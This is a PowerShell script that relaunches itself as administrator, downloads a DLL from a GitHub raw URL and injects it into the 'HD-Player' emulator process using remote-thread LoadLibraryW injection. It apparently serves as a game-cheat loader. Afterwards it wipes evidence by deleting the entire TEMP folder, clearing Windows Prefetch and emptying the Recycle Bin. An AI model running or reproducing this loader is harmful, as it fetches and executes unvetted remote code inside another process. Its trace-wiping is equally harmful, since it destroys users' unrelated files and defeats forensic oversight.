# ================== CONFIG ===================== #
$GitHubDLL_URL = "https://raw.githubusercontent.com/tasfik1974/textload-/main/textload.dll"
$processName = "HD-Player"
$LocalDLL_Path = "$env:TEMP\textload.dll"  # Better to use TEMP folder than System32
# =============================================== #

# Function to check admin rights
function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Check if running as admin
if (-not (Test-Admin)) {
    Write-Host "[-] This script requires Administrator privileges. Restarting as admin..."
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# Get process (with improved handling)
$proc = Get-Process -Name $processName -ErrorAction SilentlyContinue | Select-Object -First 1

if (-not $proc) {
    Write-Host "[-] Process '$processName' not found. Make sure it's running."
    exit
}

$TargetPID = $proc.Id
Write-Host "[*] Found process '$processName' with PID $TargetPID"

# Download DLL
try {
    Write-Host "[*] Downloading DLL from GitHub..."
    Invoke-WebRequest -Uri $GitHubDLL_URL -OutFile $LocalDLL_Path -ErrorAction Stop
    Write-Host "[+] DLL downloaded successfully to $LocalDLL_Path"
}
catch {
    Write-Host "[-] Failed to download DLL: $_"
    exit
}

# Improved injector code
$injectorCode = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.ComponentModel;

public class Injector {
    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;
    
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, pid);
        
        if (hProcess == IntPtr.Zero) {
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }
        
        // Allocate memory in the remote process
        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        if (allocMemAddress == IntPtr.Zero) {
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }
        
        // Write DLL path to remote process
        byte[] dllBytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
        UIntPtr bytesWritten;
        if (!WriteProcessMemory(hProcess, allocMemAddress, dllBytes, (uint)dllBytes.Length, out bytesWritten)) {
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }
        
        // Get address of LoadLibraryW
        IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
        IntPtr loadLibraryAddr = GetProcAddress(kernel32Handle, "LoadLibraryW");
        
        // Create remote thread
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, 
            allocMemAddress, 0, IntPtr.Zero);
        
        if (hThread == IntPtr.Zero) {
            throw new Win32Exception(Marshal.GetLastWin32Error());
        }
        
        // Wait for injection to complete
        WaitForSingleObject(hThread, 5000);
    }
}
"@

# Compile injector
try {
    Add-Type -TypeDefinition $injectorCode -Language CSharp -ErrorAction Stop
    Write-Host "[+] Injector code compiled successfully"
}
catch {
    Write-Host "[-] Failed to compile injector: $_"
    exit
}

# Perform injection
try {
    Write-Host "[*] Injecting DLL into process..."
    [Injector]::Inject($TargetPID, $LocalDLL_Path)
    Write-Host "✅ DLL injected successfully!"
}
catch {
    Write-Host "[-] Injection failed: $_"
}

# Cleaning section
Write-Host "[*] Cleaning up..."
try {
    if (Test-Path $LocalDLL_Path) {
        Remove-Item $LocalDLL_Path -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Temporary DLL removed"
    }
    
    # Clear Temp
    Get-ChildItem -Path $env:TEMP -Force | Where-Object { $_.Name -ne "" } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
    Write-Host "[+] Temp folder cleared"
    
    # Clear Prefetch (if possible)
    try {
        Get-ChildItem -Path "$env:SYSTEMROOT\Prefetch" -Force -ErrorAction Stop | Remove-Item -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Prefetch cleared"
    } catch { Write-Host "[*] Couldn't clear Prefetch (may require special permissions)" }
    
    # Empty Recycle Bin
    $recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
    $recycleBin.Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }
    Write-Host "[+] Recycle Bin emptied"
}
catch {
    Write-Host "[-] Cleanup error: $_"
}

Write-Host "✅ Script completed"
